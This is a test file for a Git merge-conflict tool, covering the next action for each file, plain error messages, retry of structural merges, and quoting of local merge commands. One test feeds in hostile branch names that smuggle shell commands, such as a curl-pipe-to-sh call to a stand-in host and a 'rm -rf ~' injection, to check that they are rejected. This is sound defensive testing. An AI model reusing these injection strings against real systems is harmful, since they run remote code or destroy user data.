import assert from 'node:assert/strict';
import test from 'node:test';
import {
  canRetryStructural,
  conflictFileAction,
  describeConflictError,
  localMergeCommands,
  shellQuote,
  STRUCTURAL_UNAVAILABLE,
} from '../lib/conflict-flow';
import { FILE_DRAFT_CHANGED } from '../lib/conflict-resolution';

void test('each file state has one next action; the result is in the diff, so a resolved file goes to Mark reviewed', () => {
  const base = { otherFilesPending: true };
  assert.equal(conflictFileAction({ ...base, stage: 'conflicted' }), 'next-conflict');
  assert.equal(conflictFileAction({ ...base, stage: 'resolved' }), 'mark-reviewed');
  assert.equal(conflictFileAction({ ...base, stage: 'reviewed' }), 'next-file');
  assert.equal(conflictFileAction({ stage: 'reviewed', otherFilesPending: false }), 'confirm');
  assert.equal(conflictFileAction({ stage: undefined, otherFilesPending: false }), 'none');
  assert.equal(conflictFileAction({ ...base, stage: 'conflicted', unsupported: true }), 'next-file');
});

void test('errors use plain copy and keep the raw output for Details', () => {
  const ctx = { stage: 'push' as const, headBranch: 'feature/retry', baseBranch: 'main' };
  const lease = describeConflictError(
    "Error invoking remote method 'conflict-resolution': Error: Git could not complete this operation. ! [rejected] feature/retry (stale info)",
    ctx
  );
  assert.equal(lease.title, 'Someone pushed to feature/retry after you started.');
  assert.match(lease.body, /^Nothing was pushed\. Your resolutions are saved\./);
  assert.equal(lease.recovery, 'load-latest');
  assert.match(lease.details ?? '', /stale info/);
  assert.equal(
    describeConflictError(
      'The PR or its base branch changed. Reopen the workspace and start a new resolution before publishing.',
      ctx
    ).recovery,
    'load-latest'
  );
  const protectedBranch = describeConflictError(
    'Git could not complete this operation. remote: error: GH006: Protected branch update failed',
    ctx
  );
  assert.match(protectedBranch.title, /Branch protection/);
  const network = describeConflictError('Git could not complete this operation. fatal: unable to access', ctx);
  assert.equal(network.recovery, 'check-again', 'A push is never resent; the user reads the branch again');
  const unknown = describeConflictError('Git could not complete this operation. fatal: something odd', ctx);
  assert.equal(unknown.recovery, 'check-again');
  assert.doesNotMatch(unknown.title + unknown.body, /fatal|Git could not/);
  const prepare = describeConflictError('Git could not complete this operation. fatal: bad object', {
    stage: 'prepare',
  });
  assert.equal(prepare.title, 'Gnosis couldn’t prepare this merge.');
  assert.equal(prepare.recovery, 'retry');
  assert.match(prepare.body, /Nothing was changed\. Try again\. If it fails again, merge on your computer\.$/);
  assert.equal(prepare.commands, undefined, 'No branches known: no commands');
  // With the PR's branches, a failed preparation says what to run instead (what happened, why, the next step).
  const local = describeConflictError('Git could not complete this operation. fatal: bad object', {
    stage: 'prepare',
    headRepo: 'klang/engine',
    baseRepo: 'klang/engine',
    headBranch: 'feature/retry',
    baseBranch: 'main',
  });
  assert.match(local.body, /in a clone of klang\/engine, run these commands\.$/);
  assert.equal(local.commands, "git switch -- 'feature/retry'\ngit pull\ngit fetch -- origin 'main'\ngit merge -- 'origin/main'");
  // A busy PR or GitHub still reading the revisions passes on its own: no local merge offered.
  const branches = { headRepo: 'klang/engine', baseRepo: 'klang/engine', headBranch: 'feature/retry', baseBranch: 'main' };
  for (const message of ['A conflict operation is already running for this PR.', 'GitHub has not returned the branch revisions yet.']) {
    const copy = describeConflictError(message, { stage: 'prepare', ...branches });
    assert.equal(copy.commands, undefined, message);
    assert.equal(copy.body, message);
  }
  assert.ok(
    describeConflictError('Resolve conflicts needs Git 2.40 or newer. Install a newer Git, then try again.', { stage: 'prepare', ...branches }).commands
  );
  assert.equal(
    describeConflictError('Select an unresolved text file.', { stage: 'other' }).title,
    'Select an unresolved text file.'
  );
  // A draft another view saved since: say so, and offer the saved draft, never "reopen" alone.
  for (const message of [
    "Error invoking remote method 'conflict-resolution': Error: The saved resolution changed. Reopen the workspace before continuing.",
    FILE_DRAFT_CHANGED,
  ]) {
    const copy = describeConflictError(message, { stage: 'other' });
    assert.equal(copy.title, 'This draft changed in another view.');
    assert.equal(copy.recovery, 'reload');
    assert.doesNotMatch(copy.body, /Reopen/);
  }
});

void test('local merge commands quote every name, and refuse names a shell could run', () => {
  const same = { headRepo: 'klang/engine', baseRepo: 'klang/engine', headBranch: 'feature/retry', baseBranch: 'main' };
  assert.equal(
    localMergeCommands(same),
    "git switch -- 'feature/retry'\ngit pull\ngit fetch -- origin 'main'\ngit merge -- 'origin/main'"
  );
  assert.equal(
    localMergeCommands({ ...same, headRepo: 'ana/engine' }),
    "git switch -- 'feature/retry'\ngit pull\ngit fetch -- 'https://github.com/klang/engine.git' 'main'\ngit merge FETCH_HEAD"
  );
  // A branch name from the PR's author that would run code when pasted: no commands at all.
  for (const headBranch of ['fix$(curl -s evil.sh|sh)', 'fix`id`', "fix';rm -rf ~;'", 'fix branch', 'fix\nrm', '--upload-pack=x', '-b'])
    assert.equal(localMergeCommands({ ...same, headBranch }), undefined, headBranch);
  assert.equal(localMergeCommands({ ...same, baseRepo: 'klang/engine;id' }), undefined);
  assert.equal(shellQuote("it's"), "'it'\\''s'");
});

void test('Try structural merge again shows only on the prepared draft, where it can help', () => {
  const timedOut = { structuralNote: 'Structural merge timed out.', source: 'manual' as const };
  assert.equal(canRetryStructural(timedOut, true), true);
  assert.equal(canRetryStructural(timedOut, false), false, 'Never over your choices or edits');
  assert.equal(canRetryStructural({ ...timedOut, structuralNote: STRUCTURAL_UNAVAILABLE }, true), false);
  assert.equal(canRetryStructural({ source: 'rerere' }, true), true);
  assert.equal(canRetryStructural({ source: 'manual', proposals: [{ source: 'rerere', text: 'a' }] }, true), true);
  assert.equal(canRetryStructural({ source: 'mergiraf', proposals: [{ source: 'mergiraf', text: 'a' }] }, true), false);
  assert.equal(
    canRetryStructural({ ...timedOut, proposals: [{ source: 'union', text: 'a' }, null] }, true),
    false,
    'Never throws unions away'
  );
  assert.equal(
    canRetryStructural({ ...timedOut, wholeFile: { source: 'mergiraf', text: 'a' } }, true),
    false,
    'A whole-file proposal already holds the result'
  );
});
